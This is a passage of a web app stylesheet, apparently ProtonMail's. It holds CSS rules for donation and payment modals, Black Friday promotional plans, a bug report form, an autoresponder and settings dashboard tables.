            width: 70px
        }

        .featuresList-text {
            margin-top: 10px
        }

        .featuresList-button-wrapper,
        .featuresList-logo,
        .featuresList-text {
            pointer-events: none
        }

        .featuresList-button:hover {
            opacity: 1
        }

        .featuresList-container>[class*=featuresList-] {
            display: none
        }

        .featuresList-container.featuresList-hasVPN .featuresList-vpn,
        .featuresList-container.featuresList-isPlus .featuresList-autoresponder,
        .featuresList-container.featuresList-isPlus .featuresList-domains,
        .featuresList-container.featuresList-isPlus .featuresList-filters,
        .featuresList-container.featuresList-isProfessional .featuresList-autoresponder,
        .featuresList-container.featuresList-isProfessional .featuresList-domains,
        .featuresList-container.featuresList-isProfessional .featuresList-filters,
        .featuresList-container.featuresList-isProfessional .featuresList-members,
        .featuresList-container.featuresList-isVisionary .featuresList-autoresponder,
        .featuresList-container.featuresList-isVisionary .featuresList-domains,
        .featuresList-container.featuresList-isVisionary .featuresList-filters,
        .featuresList-container.featuresList-isVisionary .featuresList-members,
        .featuresList-container.featuresList-isVisionary .featuresList-vpn {
            display: block
        }

        body.appConfigBody-is-mobile .featuresList-container {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        body.appConfigBody-is-mobile .featuresList-button {
            opacity: 1
        }

        body.appConfigBody-is-mobile .featuresList-logo {
            width: 100px
        }

        .bitcoinView-container:not(.bitcoinView-type-invoice) .bitcoinView-about-invoice,
        .bitcoinView-type-invoice .bitcoinView-about {
            display: none
        }

        [class*=bitcoinView-type-] .bitcoinView-qrcode {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        [class*=bitcoinView-type-] [class*=bitcoinDetails-label-]:after {
            content: ":";
            margin-right: .5em
        }

        [class*=bitcoinView-type-] .bitcoinDetails-item-address {
            text-align: center;
            margin-top: .5em
        }

        [class*=bitcoinView-type-] .bitcoinDetails-label-address {
            display: block
        }

        [class*=bitcoinView-type-] .bitcoinDetails-label-amount {
            display: inline-block
        }

        .bitcoinView-btn-reload {
            background: none;
            border: 0;
            padding: 0;
            color: #000;
            text-decoration: underline
        }

        .bitcoinView-btn-reload:hover {
            text-decoration: none
        }

        .paypal-error-amount[data-type=max] .paypal-error-min,
        .paypal-error-amount[data-type=min] .paypal-error-max {
            display: none
        }

        .donationForm-container.donationForm-is-invalid[class*=ng-invalid-] .ng-invalid {
            border: 1px solid #cc9393
        }

        .donationForm-container.donationForm-is-invalid [ng-messages][ng-messages][ng-messages] {
            opacity: 1
        }

        .donationForm-container [ng-message] {
            margin: .5em 0 0
        }

        .donationForm-amount-row-2 {
            margin-bottom: 0
        }

        .donationForm-cardView {
            margin-top: 1em
        }

        .donationForm-method-cash .donationForm-btn-submit,
        .donationForm-method-payal .donationForm-btn-submit {
            display: none
        }

        .giftCodeInput-container {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .giftCodeInput-icon {
            color: #acb0bf;
            position: absolute;
            z-index: 1;
            top: 10px;
            left: 10px
        }

        .giftCodeInput-input {
            padding-left: 30px !important
        }

        .giftCodeInput-errors {
            color: #cc9393
        }

        .giftCodeBtn-container {
            background: transparent;
            border: 0;
            color: #9397cd;
            text-decoration: underline
        }

        .feedback textarea {
            width: 100%;
            height: 8rem;
            padding: 0 .5rem
        }

        .navigationBlackFriday-button {
            background: transparent;
            border: none
        }

        .navigationBlackFriday-icon,
        .navigationBlackFriday-icon:after {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .navigationBlackFriday-icon {
            width: 100%
        }

        .navigationBlackFriday-icon:after {
            content: "%";
            width: 20px;
            height: 20px;
            border-radius: 50%;
            font-family: arial;
            font-weight: 700;
            text-transform: none;
            font-size: 11px;
            -webkit-animation: pusate 2s infinite alternate;
            animation: pusate 2s infinite alternate
        }

        .blackFridayModal.pm_modal .modal-dialog .modal-body h3,
        .blackFridayModal.pm_modal .modal-dialog .modal-header h3 {
            text-transform: uppercase;
            font-weight: 700
        }

        .blackFridayModal.pm_modal .modal-dialog .modal-content .modal-header h3 {
            font-size: 2.4em;
            padding: 20px 0 0
        }

        .blackFridayModal.pm_modal .modal-dialog .modal-body h3 {
            line-height: 1.4em;
            font-size: 1.1em;
            padding: 0 30px 1em 0
        }

        .blackFridayModal.pm_modal .modal-dialog .modal-content .modal-body {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .blackFriday-end,
        .blackFriday-intro {
            margin: 0;
            line-height: 1.4em;
            opacity: .9
        }

        .blackFriday-end {
            margin: 20px 0
        }

        .blackFridayPrice-container {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            height: 46px;
            padding-left: 60px
        }

        .blackFridayPrice-container:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 46px;
            height: 46px;
            border-radius: 2px
        }

        .blackFridayPrice-top {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .blackFridayPrice-amount {
            font-size: 1.3em
        }

        .blackFridayPrice-strike {
            margin: 2px 0 0 6px;
            font-size: 1em
        }

        .blackFridayPrice-monthly,
        .blackFridayPrice-strike {
            opacity: .6
        }

        .blackFridayFree-container {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding-top: 30px
        }

        .blackFridayFree-container,
        .blackFridayFree-plans {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .blackFridayFree-plans {
            margin-bottom: 20px
        }

        .blackFridayFree-plans .blackFridayFree-plan:not(:last-of-type) {
            margin-right: 20px
        }

        .blackFridayFree-plan {
            width: 33%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            position: relative;
            border-radius: 2px;
            padding: 1em;
            background-color: #f1f2f9;
            border: 2px solid #6bb16f;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .blackFridayFree-mail-plan {
            border-color: #9397cd
        }

        .blackFridayFree-plan>p {
            opacity: .7
        }

        .blackFridayFree-tag {
            position: absolute;
            right: -14px;
            top: -14px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            color: #fff;
            background-color: #d12e26;
            font-style: normal;
            -webkit-transform: scale(.9);
            transform: scale(.9)
        }

        .blackFridayFree-title {
            font-size: 2em;
            color: #fff
        }

        .blackFridayFree-buy {
            margin: auto auto 0;
            padding: 0 26px
        }

        .blackFridayFree-footer {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            font-weight: 700
        }

        .blackFridayFree-dashboard,
        .blackFridayFree-dropdown-currency {
            line-height: 1.2em
        }

        .blackFridayFree-dropdown-currency.active>i {
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg)
        }

        .blackFridayFree-currencies {
            list-style: none;
            padding: 0;
            left: 20px
        }

        .blackFridayFree-currencies li {
            padding: 0;
            border-bottom: 1px solid #f1f2f9
        }

        .blackFridayFree-currencies li button {
            width: 100%;
            border: 0;
            padding: 10px
        }

        .blackFridayFree-currencies li button:hover {
            background: #f1f2f9
        }

        .blackFridayFree-mail-plan .blackFridayPrice-container:before {
            background: url(assets/img/logo-sign.svg) no-repeat 13px 8px/160px, #9397cd
        }

        .blackFridayFree-vpn-plan .blackFridayPrice-container:before {
            background: url(assets/img/protonvpn-sign.svg) no-repeat -6px 6px/60px, #6bb16f
        }

        .blackFridayFree-mail-vpn-plan .blackFridayPrice-container:before {
            background: url(assets/img/protonvpn-sign.svg) no-repeat 14px 20px/40px, url(assets/img/logo-sign.svg) no-repeat 8px 6px/100px, -webkit-gradient(linear, left top, right bottom, from(#9397cd), color-stop(30%, #9397cd), color-stop(70%, #6bb16f), to(#6bb16f));
            background: url(assets/img/protonvpn-sign.svg) no-repeat 14px 20px/40px, url(assets/img/logo-sign.svg) no-repeat 8px 6px/100px, linear-gradient(to right bottom, #9397cd 0, #9397cd 30%, #6bb16f 70%, #6bb16f)
        }

        .appConfigBody-is-mobile .blackFridayFree-plans {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .appConfigBody-is-mobile .blackFridayFree-plans .blackFridayFree-plan {
            width: 100%;
            margin: 0 0 20px
        }

        .blackFridayPaid-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .blackFridayPaid-banner {
            margin: 20px auto;
            max-width: 100%
        }

        .blackFridayPaid-actions {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            list-style: none;
            padding: 0
        }

        .blackFridayPaid-actions>li {
            margin-bottom: 10px
        }

        .bugModalForm .ng-message-wrapper {
            position: relative;
            margin-bottom: .4em
        }

        .bugModalForm [ng-messages] {
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            z-index: 2;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin: .3em 0 0 !important;
            font-weight: 700;
            line-height: .9em;
            font-size: .8em;
            color: #cc9393
        }

        .bugModalForm [ng-messages] [ng-message] {
            margin: 0 !important
        }

        .bugModalForm [ng-messages] * [ng-message]:not(:last-of-type):after {
            content: ", ";
            margin-right: .4em
        }

        .bugModalForm input {
            padding: 0 .8em
        }

        .bugModalForm textarea {
            padding: .4em .8em
        }

        .bugModalForm form .pm_select select:focus,
        .bugModalForm input:focus,
        .bugModalForm textarea:focus {
            border-color: #9397cd;
            -webkit-box-shadow: inset 0 1px 2px rgba(147, 151, 205, .3), 0 0 0 .2em rgba(147, 151, 205, .3);
            box-shadow: inset 0 1px 2px rgba(147, 151, 205, .3), 0 0 0 .2em rgba(147, 151, 205, .3)
        }

        .bugModalForm input:focus,
        .bugModalForm textarea:focus {
            background-color: #fff
        }

        .bugModalForm .ng-dirty+[ng-messages],
        .bugModalForm .ng-invalid [ng-message-warning],
        .bugModalForm .ng-untouched+[ng-messages],
        .bugModalForm .ng-valid+[ng-messages] {
            opacity: 0
        }

        .bugModalForm .ng-submitted .ng-invalid:not(:focus)~[ng-messages],
        .bugModalForm .ng-submitted [class*=ng-warning]:not(:focus)~[ng-messages],
        .bugModalForm .ng-touched.ng-invalid:not(:focus)~[ng-messages],
        .bugModalForm .ng-touched[class*=ng-warning]:not(:focus)~[ng-messages] {
            opacity: 1
        }

        .bugModalForm .ng-submitted .ng-invalid:not(:focus),
        .bugModalForm .ng-touched.ng-invalid:not(:focus) {
            border-color: #cc9393;
            -webkit-box-shadow: inset 0 1px 2px hsla(0, 36%, 69%, .3), 0 0 0 .2em hsla(0, 36%, 69%, .3);
            box-shadow: inset 0 1px 2px hsla(0, 36%, 69%, .3), 0 0 0 .2em hsla(0, 36%, 69%, .3)
        }

        .bugModalForm .ng-messages-warning {
            display: none
        }

        .bugModalForm .ng-submitted [class*=ng-warning]:not(:focus),
        .bugModalForm .ng-touched[class*=ng-warning]:not(:focus) {
            display: block;
            border-color: orange;
            -webkit-box-shadow: inset 0 1px 2px rgba(255, 165, 0, .3), 0 0 0 .2em rgba(255, 165, 0, .3);
            box-shadow: inset 0 1px 2px rgba(255, 165, 0, .3), 0 0 0 .2em rgba(255, 165, 0, .3)
        }

        .bugModalForm .ng-submitted [class*=ng-warning]:not(:focus)+[ng-messages],
        .bugModalForm .ng-touched[class*=ng-warning]:not(:focus)+[ng-messages] {
            color: orange
        }

        .bugModalForm .ng-submitted [class*=ng-warning]:not(:focus)+[ng-messages] .ng-messages-warning,
        .bugModalForm .ng-touched[class*=ng-warning]:not(:focus)+[ng-messages] .ng-messages-warning {
            display: block
        }

        .bugModalView-input-file {
            display: none
        }

        .pm_form .bugModalView-input-label {
            text-decoration: none;
            color: #666;
            padding: 0 10px;
            height: 35px;
            line-height: 35px;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: inline-block;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
            background-color: transparent;
            -webkit-transition: all .3s ease-out;
            transition: all .3s ease-out;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            vertical-align: middle
        }

        .bugModalView-input-label:hover {
            background-color: #f2f2f2;
            color: #222;
            -webkit-transition: none;
            transition: none
        }

        .bugModalView-upload-success-message {
            font-weight: 700;
            margin-right: 20px
        }

        .bugModalView-container:not(.bugModalView-files-uploaded) .bugModalView-upload-success,
        .bugModalView-files-uploaded .bugModalView-input-label,
        .bugModalView-files-uploaded .bugModalView-upload-info,
        .donateModal-container.donateModal-type-donation [class$=-topUp] {
            display: none
        }

        .donateModal-container .donationForm-cardView .pm_grid {
            margin-bottom: 0
        }

        .donateModal-container.donateModal-type-topUp .donateModal-about-bitcoin,
        .donateModal-container.donateModal-type-topUp [class$=-donate],
        .donateModal-container:not(.donateModal-mode-bitcoin):not(.donateModal-mode-cash) .donateModal-btn-close {
            display: none
        }

        .donateModal-group-btn {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .donateModal-container .donationForm-footer,
        .donateModal-container .donationForm-info {
            display: none
        }

        .donateModal-mode-bitcoin.donateModal-type-donation .bitcoinView-about,
        .donateModal-mode-bitcoin.donateModal-type-donation .donateModal-btn-cancel,
        .donateModal-mode-bitcoin.donateModal-type-donation .donateModal-btn-donate,
        .donateModal-mode-bitcoin.donateModal-type-donation [class*=donateModal-choose],
        .donateModal-mode-bitcoin.donateModal-type-donation [for=otherAmount],
        .donateModal-mode-cash .bitcoinView-about,
        .donateModal-mode-cash .donateModal-btn-cancel,
        .donateModal-mode-cash .donateModal-btn-donate,
        .donateModal-mode-cash [class*=donateModal-choose],
        .donateModal-mode-cash [for=otherAmount] {
            display: none;
            pointer-events: none
        }

        .donateModal-mode-bitcoin .donateModal-btn-cancel {
            display: none
        }

        .donateModal-mode-bitcoin .donateModal-group-btn,
        .donateModal-mode-cash .donateModal-group-btn,
        .donateModal-mode-paypal .donateModal-group-btn {
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .donateModal-mode-bitcoin .donateModal-btn-donation,
        .donateModal-mode-cash .donateModal-btn-donation,
        .donateModal-mode-paypal .donateModal-btn-donation,
        .paymentForm-cycle-2-years .paymentForm-about-month,
        .paymentForm-cycle-2-years .paymentForm-paypal-about-month,
        .paymentForm-cycle-year .paymentForm-about-month,
        .paymentForm-cycle-year .paymentForm-paypal-about-month,
        .paymentsModal-container.paymentsModal-step-thanks .paymentsModal-btn-cancel,
        .paymentsModal-container.paymentsModal-step-thanks .paymentsModal-btn-submit,
        .paymentsModal-container.paymentsModal-step-thanks .paymentsModal-title,
        .paymentsModal-container:not(.paymentsModal-step-pay) .paymentsModal-paymentForm,
        .paymentsModal-container:not(.paymentsModal-step-process) .paymentsModal-process,
        .paymentsModal-container:not(.paymentsModal-step-thanks) .paymentsModal-btn-close,
        .paymentsModal-container:not(.paymentsModal-step-thanks) .paymentsModal-thanks,
        .paymentsModal-method-paypal:not(.paymentsModal-enough-credit) .paymentsModal-btn-submit,
        .paymentsModal-step-process .paymentsModal-btn-submit {
            display: none
        }

        .paymentsModal-container.paymentsModal-step-thanks .modal-dialog .modal-content .modal-body {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .paymentsModal-container.paymentsModal-step-thanks .paymentsModal-group-btn {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .paymentsModal-container.paymentsModal-step-thanks .paymentsModal-btn-close {
            margin-left: auto
        }

        .paymentsModal-container.paymentsModal-step-thanks .modal-dialog .modal-content h3 {
            text-transform: uppercase;
            color: #9397cd
        }

        .paymentsModal-group-btn {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .paymentsModal-method-bitcoin .paymentsModal-group-btn,
        .paymentsModal-method-cash .paymentsModal-group-btn,
        .paymentsModal-method-paypal .paymentsModal-group-btn,
        .paymentsModal-step-process .paymentsModal-group-btn {
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .paymentsModal-container.paymentsModal-method-bitcoin .paymentsModal-btn-cancel,
        .paymentsModal-container.paymentsModal-method-bitcoin .paymentsModal-btn-submit,
        .paymentsModal-container.paymentsModal-method-cash .paymentsModal-btn-cancel,
        .paymentsModal-container.paymentsModal-method-cash .paymentsModal-btn-submit {
            display: none
        }

        .paymentsModal-container.paymentsModal-method-bitcoin .paymentsModal-btn-close,
        .paymentsModal-container.paymentsModal-method-cash .paymentsModal-btn-close {
            display: inline-block
        }

        .paymentsModal-container .giftCodeBtn-icon {
            display: none
        }

        .releaseNotesModal-container img {
            max-width: 100%
        }

        .releaseNotesModal-container .modal-header {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .releaseNotesModal-container .infoLink {
            margin-top: 10px;
            color: #4d4c5d
        }

        .releaseNotesModal-container .group {
            font-size: 13px !important;
            line-height: 13px !important;
            color: #fff !important;
            padding: 3px 5px;
            text-transform: uppercase;
            display: inline-block;
            border-radius: 2px
        }

        .releaseNotesModal-container .features {
            background-color: #009800
        }

        .releaseNotesModal-container .bugs {
            background-color: #fc2929
        }

        .releaseNotesModal-container .others {
            background-color: #aeaeba
        }

        .releaseNotesModal-container .change {
            margin-bottom: 3px
        }

        .autoresponderCharacters,
        .autoresponderEmptyMessage {
            display: none
        }

        .autoresponderEmptyMessage,
        .autoresponderMessageTooLong {
            color: #cc9393
        }

        .autoresponderEmpty>.autoresponderEmptyMessage,
        .autoresponderFull>.autoresponderMessageTooLong,
        .autoresponderHalfFull>.autoresponderLengthWarning {
            display: block
        }

        .autoresponderFull.autoresponderHalfFull>.autoresponderLengthWarning {
            display: none
        }

        .autoresponderCharacterCount {
            font-weight: 700
        }

        .autoresponderCharacters {
            text-align: right
        }

        .autoresponderMessageDisabler {
            position: absolute;
            top: 0;
            right: 0;
            left: 0;
            bottom: 0;
            z-index: 2000;
            background: hsla(0, 0%, 100%, .7);
            margin: 1px
        }

        .autoresponderMessageContainer {
            position: relative
        }

        .autoresponderMessageContainer .addFilePopover-allow-uri .addFilePopover-btn-uri {
            display: none
        }

        .autoresponderMessageContainer .angular-squire-wrapper {
            height: 250px
        }

        .overviewSection-container .giftCodeBtn-icon,
        .overviewSection-container.overviewSection-plan-free .overviewSection-addresses-total,
        .overviewSection-container.overviewSection-plan-free .overviewSection-domains-name,
        .overviewSection-container.overviewSection-plan-free .overviewSection-link-manage,
        .overviewSection-container.overviewSection-plan-free .overviewSection-link-signatureManager,
        .overviewSection-container.overviewSection-plan-free .overviewSection-storage-size,
        .overviewSection-container .topUp-button .donateBtn-icon,
        .overviewSection-container:not(.overviewSection-plan-free) .overviewSection-addresses-free,
        .overviewSection-container:not(.overviewSection-plan-free) .overviewSection-domains-free,
        .overviewSection-container:not(.overviewSection-plan-free) .overviewSection-link-signatureUpgrade,
        .overviewSection-container:not(.overviewSection-plan-free) .overviewSection-link-upgrade,
        .overviewSection-container:not(.overviewSection-plan-free) .overviewSection-storage-free {
            display: none
        }

        .overviewSection-container .topUp-button {
            border: 0;
            background: transparent;
            color: #9397cd;
            text-decoration: underline
        }

        .overviewSection-couponCode {
            background-color: #fff;
            border: 1px dashed #acb0bf
        }

        .settingsDashboard-overview-section {
            min-height: 0
        }

        .settingsDashboard-overview-section,
        .settingsDashboard-overview-section-table-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .settingsDashboard-overview-section-table-container {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            border: 1px solid #acb0bf
        }

        .settingsDashboard-btn-donation .donateBtn-icon {
            display: none
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            width: 100%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            overflow: hidden;
            padding: 15px 0 0
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing>tr,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody>tr {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            padding: 0 10px
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing>tr>td,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing>tr>th,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody>tr>td,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody>tr>th {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: .5em
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing>tr>th,
        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody>tr>th {
            width: 150px;
            text-align: left
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-storage {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-storage>* {
            width: 100%
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-storage .storageBar {
            margin-top: 0
        }

        .settingsDashboard-overview-section-table-container .overviewSection-container .overviewSection-tbody-billing {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding: 1em 0;
            background: url(assets/img/triangle-down.svg) #f8f8f8 repeat-x 0 -2px;
            background-size: 8px
        }

        .settingsDashboard-subscription-section {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            min-height: 0
        }

        .settingsDashboard-subscription-section-table-container {
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            border: 1px solid #acb0bf
        }

        .settingsDashboard-subscription-section-table-container,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table {
            -webkit-box-flex: 1;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table {
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            width: 100%;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            overflow: hidden;
            padding: 15px 0 0
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-plans {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons>tr,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing>tr,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-plans>tr {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            padding: 0 10px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons>tr>td,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing>tr>td,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-plans>tr>td {
            display: block;
            padding: .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-plans {
            position: relative;
            z-index: 1;
            padding-bottom: .5em
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons {
            opacity: .8
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons>tr {
            padding-left: 30px
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons tr:first-of-type {
            border-top: 2px dashed #f8f8f8;
            padding-top: .5em
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            background: #f8f8f8;
            background-size: 8px;
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing>tr:first-of-type {
            padding-top: 1em;
            background: url(assets/img/triangle-down.svg) repeat-x 0 -2px;
            background-size: 8px
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-billing>tr:last-of-type {
            padding-bottom: 1em
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-list {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-item-title {
            width: 70%
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-addons,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-item-addons {
            width: 100%
        }

